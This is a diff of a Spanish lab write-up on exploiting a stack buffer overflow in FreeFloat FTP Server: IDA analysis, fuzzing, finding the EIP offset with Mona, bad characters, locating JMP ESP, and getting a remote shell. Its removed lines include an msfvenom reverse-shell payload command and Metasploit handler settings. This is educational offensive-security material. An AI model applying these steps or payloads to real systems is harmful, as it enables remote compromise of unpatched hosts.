@@ -2,7 +2,7 @@
 
 ## 📌 Descripción
 
-En esta sección se documenta el proceso completo de explotación de una vulnerabilidad de tipo **stack buffer overflow** en el servicio FreeFloat FTP Server, dentro de un entorno de laboratorio controlado.
+En esta sección se documenta el proceso completo de explotación de una vulnerabilidad de tipo **stack buffer overflow** en el servicio **FreeFloat FTP Server**, dentro de un entorno de laboratorio controlado.
 
 El objetivo es demostrar cómo, a partir de un fallo en la gestión de memoria, es posible tomar el control del flujo de ejecución y conseguir una shell remota.
 
@@ -10,9 +10,9 @@ El objetivo es demostrar cómo, a partir de un fallo en la gestión de memoria, 
 
 ## 🧪 Entorno de laboratorio
 
-- Máquina víctima: Windows (FreeFloat FTP Server)
-- Máquina atacante: Kali Linux
-- Herramientas utilizadas:
+- **Máquina víctima:** Windows con FreeFloat FTP Server
+- **Máquina atacante:** Kali Linux
+- **Herramientas utilizadas:**
   - IDA Free
   - Immunity Debugger
   - Mona.py
@@ -24,130 +24,237 @@ El objetivo es demostrar cómo, a partir de un fallo en la gestión de memoria, 
 
 ## 🔍 1. Análisis estático con IDA
 
-Se abrió el binario del servidor FTP en IDA Free para realizar un análisis inicial del código.
+Se abrió el binario del servidor FTP en **IDA Free** para realizar un análisis inicial del código.
 
-Para facilitar la lectura:
-- View → Open Subviews → Generate Pseudocode
-- Click derecho → Synchronize with → Pseudocode-A
+Para facilitar la lectura del flujo del programa, se activó la vista en pseudocódigo desde:
 
-Se buscaron cadenas relevantes como "USER" para localizar funciones críticas.
+`View → Open Subviews → Generate Pseudocode`
+
+Después, se sincronizó el diagrama de flujo con el panel de pseudocódigo usando:
+
+`Click derecho sobre el panel de flujo → Synchronize with → Pseudocode-A`
+
+![Vista de IDA con pseudocódigo](02%20Explotacion/IMG/vista%20ida%20geenrate.png)
+
+A continuación, se revisaron las cadenas del binario para localizar comandos interesantes del protocolo FTP. Para ello se abrió la subvista **Strings** y se filtró por `USER`.
+
+![Vista sincronizada](02%20Explotacion/IMG/vista%20sincronize.png)
+
+![Búsqueda de strings](02%20Explotacion/IMG/vista%20string.png)
+
+A partir de esa cadena se revisaron sus referencias cruzadas para identificar qué función la utilizaba.
+
+![Gráfico de referencias](02%20Explotacion/IMG/graf.png)
+
+Del análisis se observó que una de las funciones implicadas realizaba operaciones inseguras sobre memoria, como el uso de `strcpy` sin una validación adecuada del tamaño de entrada.
+
+![Uso inseguro de strcpy](02%20Explotacion/IMG/strcpy.png)
 
 ---
 
 ## ⚙️ 2. Ejecución y depuración del servicio
 
-Se ejecutó el servidor FTP y se adjuntó Immunity Debugger al proceso:
+Con la información obtenida en el análisis estático, se inició el servidor FTP haciendo doble clic sobre el binario.
 
-File → Attach → seleccionar proceso → Enter
+![Servidor FTP ejecutándose](02%20Explotacion/IMG/ftpserver.png)
 
-Se reanudó la ejecución con el botón Play.
+Después se abrió **Immunity Debugger** y se adjuntó al proceso del servidor para monitorizar su actividad:
 
-Se verificó el servicio con:
+`File → Attach → seleccionar proceso → Enter`
 
+![Adjuntar proceso en Immunity](02%20Explotacion/IMG/attach%20ftp.png)
+
+Una vez adjuntado, se obtuvo la vista del depurador asociada al proceso.
+
+![Proceso adjuntado en Immunity](02%20Explotacion/IMG/immunity_ftp.png)
+
+> **Nota:** Immunity pausa la ejecución por defecto. Por eso fue necesario pulsar el botón **Play** para que el servicio siguiera funcionando con normalidad.
+
+Antes de comenzar con las pruebas, se verificó que el servicio estaba activo y aceptando conexiones:
+
+```bash
 ncat localhost 21
+```
+
+![Comprobación del servicio con ncat](02%20Explotacion/IMG/NCATRUN.png)
 
 ---
 
 ## 💥 3. Fuzzing
 
-Se enviaron cadenas crecientes hasta provocar un crash.
+Confirmado que el servicio estaba activo, se pasó a la fase de **fuzzing**, enviando buffers de tamaño creciente para identificar si alguna entrada provocaba un fallo.
 
-Se observó en Immunity:
-EIP = 41414141
+![Ejecución del fuzzing](02%20Explotacion/IMG/fuzzing.png)
 
-Esto confirma el desbordamiento.
+Tras varias iteraciones, el servicio perdió la conexión al alcanzar un tamaño determinado. Al revisar el estado del proceso en **Immunity Debugger**, se observó que el registro **EIP** había sido sobrescrito con el valor `41414141`, correspondiente a la letra `A`.
+
+![Sobrescritura del EIP](02%20Explotacion/IMG/register.png)
+
+Esto confirmó que el desbordamiento era real y que existía la posibilidad de controlar el flujo de ejecución.
 
 ---
 
 ## ⚙️ 4. Configuración de Mona
 
+Como paso previo a la explotación, se configuró **Mona** para trabajar con un directorio propio:
+
+```text
 !mona config -set workingfolder c:\mona
+```
+
+![Configuración de Mona](02%20Explotacion/IMG/mona.png)
 
 ---
 
 ## 🎯 5. Control del EIP
 
+Para calcular con precisión el punto exacto en el que se sobrescribía el **EIP**, se generó un patrón único de 400 bytes con Mona:
+
+```text
 !mona pattern_create 400
+```
 
-Se envió el patrón y se obtuvo el valor de EIP.
+El patrón se copió al script correspondiente y se envió al servicio.
 
+![Patrón generado e insertado en el script](02%20Explotacion/IMG/patterm.png)
+
+Tras lanzar la prueba y observar el nuevo valor de **EIP**, se utilizó Mona para calcular el offset exacto:
+
+```text
 !mona pattern_offset 41326941
+```
 
-Resultado: 246
+![Cálculo del offset](02%20Explotacion/IMG/offset.png)
 
-Validación:
-EIP = 42424242
+El resultado obtenido fue un **offset de 246 bytes**. Para confirmarlo, se construyó una nueva entrada formada por:
+
+- 246 caracteres `A`
+- 4 caracteres `B` para sobrescribir el EIP
+
+![Valor observado en EIP](02%20Explotacion/IMG/eip.png)
+
+![Script de validación del EIP](02%20Explotacion/IMG/pythoneip.png)
+
+![EIP sobrescrito con 42424242](02%20Explotacion/IMG/eip42.png)
+
+![Confirmación visual del offset](02%20Explotacion/IMG/aaabbb.png)
+
+El valor `42424242` en **EIP** confirmó que el control del registro era correcto.
 
 ---
 
-## 🚫 6. Bad Chars
+## 🚫 6. Identificación de Bad Characters
 
+Una vez controlado el **EIP**, el siguiente paso fue localizar los caracteres problemáticos o **badchars**, es decir, aquellos bytes que interrumpen o alteran la ejecución del payload.
+
+Para ello se generó un array de bytes con Mona:
+
+```text
 !mona bytearray
+```
 
-Se comparó memoria:
+Ese contenido se añadió al script encargado de enviar la prueba.
 
-!mona compare -f c:\mona\bytearray.bin -a ESP
+![Script con bytearray](02%20Explotacion/IMG/script05.png)
 
-Badchars detectados:
+Después de provocar el crash, se siguió el contenido apuntado por **ESP** usando la opción **Follow in Dump** y se comparó la memoria real con el bytearray generado por Mona.
+
+![Seguimiento en dump](02%20Explotacion/IMG/badchar41.png)
+
+```text
+!mona compare -f c:\mona\bytearray.bin -a 0092FBE4
+```
+
+![Comparación con Mona](02%20Explotacion/IMG/0092FBE4.png)
+
+En la primera iteración se detectó el byte `\x00`, por lo que se eliminó del array y se regeneró el bytearray excluyéndolo:
+
+```text
+!mona bytearray -b "\x00"
+```
+
+Tras repetir el proceso varias veces, se determinó que los **badchars** para este caso eran:
+
+```text
 \x00 \x0A \x0D
+```
+
+![Badchars finales](02%20Explotacion/IMG/00.png)
 
 ---
 
-## 🔁 7. JMP ESP
+## 🔁 7. Búsqueda de JMP ESP
 
+El siguiente paso fue localizar una instrucción **JMP ESP** válida, que permitiera redirigir la ejecución hacia la pila, donde más adelante se colocaría el shellcode.
+
+Primero se obtuvo el opcode correspondiente con Mona:
+
+```text
 !mona asm -s "jmp esp"
-Resultado: \xff\xe4
+```
 
+Resultado:
+
+```text
+\xff\xe4
+```
+
+![Opcode de JMP ESP](02%20Explotacion/IMG/xe4.png)
+
+Después se buscaron direcciones que contuvieran ese opcode y que no incluyeran ninguno de los badchars detectados:
+
+```text
 !mona find -s "\xff\xe4" -cpb "\x00\x0A\x0D"
+```
 
-Se seleccionó una dirección válida.
+![Búsqueda de dirección JMP ESP](02%20Explotacion/IMG/758FA007.png)
 
----
+Se seleccionó una dirección válida y se introdujo en el script para sobrescribir el **EIP**.
 
-## 🧪 8. Validación
+![Script con dirección JMP ESP](02%20Explotacion/IMG/06script.png)
 
-Se verificó que el flujo llegaba a la pila correctamente.
+Al ejecutar el script, se comprobó que el flujo continuaba por la zona prevista, comenzando por una secuencia de NOPs.
 
----
-
-## 💣 9. Shellcode
-
-msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=443 -f python -b "\x00\x0a\x0d"
+![Validación del salto](02%20Explotacion/IMG/mov.png)
 
 ---
 
-## 🎯 10. Explotación final
+## 💣 8. Generación del shellcode
 
-Metasploit:
+Con la parte estructural de la explotación ya preparada, se generó un payload con **msfvenom** desde la máquina Kali Linux.
 
-use exploit/multi/handler
-set payload windows/shell_reverse_tcp
-set LHOST TU_IP
-set LPORT 443
-exploit
+![Generación de shellcode con msfvenom](02%20Explotacion/IMG/kali_msf.png)
 
-Se obtuvo shell remota.
+En este laboratorio, el payload era de tipo **reverse TCP**, por lo que se configuró para que la máquina víctima se conectara a la IP y puerto de la máquina Kali.
+
+---
+
+## 🎯 9. Explotación final
+
+Una vez reemplazado el shellcode de prueba por el shellcode real y ajustados los valores definitivos en el script, se ejecutó la versión final del exploit.
+
+![Script final de explotación](02%20Explotacion/IMG/07script.png)
+
+El programa continuó en estado **running**, lo que indicaba que el proceso no se había cerrado y que el flujo de ejecución había sido redirigido correctamente.
+
+Por último, en la consola de Kali donde se había dejado preparado el handler de Metasploit, se recibió la shell remota.
+
+![Shell remota obtenida](02%20Explotacion/IMG/final.png)
 
 ---
 
 ## ✅ Conclusión
 
-Se ha conseguido:
+Durante esta práctica se demostró que el servicio **FreeFloat FTP Server** presentaba una vulnerabilidad de tipo **stack buffer overflow** explotable en un entorno controlado.
 
-- Control del EIP
-- Redirección del flujo
-- Ejecución remota de comandos
+A lo largo del proceso se consiguió:
 
-Laboratorio realizado en entorno controlado con fines educativos.
+- provocar el fallo mediante fuzzing,
+- calcular el offset exacto al **EIP**,
+- identificar los **badchars**,
+- localizar una instrucción **JMP ESP** válida,
+- redirigir el flujo de ejecución,
+- y finalmente obtener una **shell remota**.
 
-
-### 🛡️ Conclusiones y Defensa
-Explotar el CVE-2025-5548 en un laboratorio nos enseña por qué las vulnerabilidades de corrupción de memoria son tan críticas.
-
-Para que un equipo de Blue Team pueda defenderse de ataques similares, se recomiendan las siguientes medidas:
-
-Compilación Segura: El software debe compilarse activando protecciones modernas del sistema operativo como ASLR (que aleatoriza las direcciones de memoria), DEP (que impide ejecutar código en la pila) y SafeSEH.
-
-Validación de Entradas: Sustituir funciones inseguras en C/C++ (como strcpy) por alternativas que limiten el tamaño del búfer (como strncpy).
-
-Gestión del Software Legado: Priorizar el parcheo, aislamiento en red o sustitución directa de servicios antiguos (como FreeFloat FTP) que ya no reciben soporte de seguridad.
+Este laboratorio permitió recorrer de forma práctica todas las fases habituales de una explotación clásica de desbordamiento de búfer, desde el análisis inicial hasta la validación final del impacto.
+v
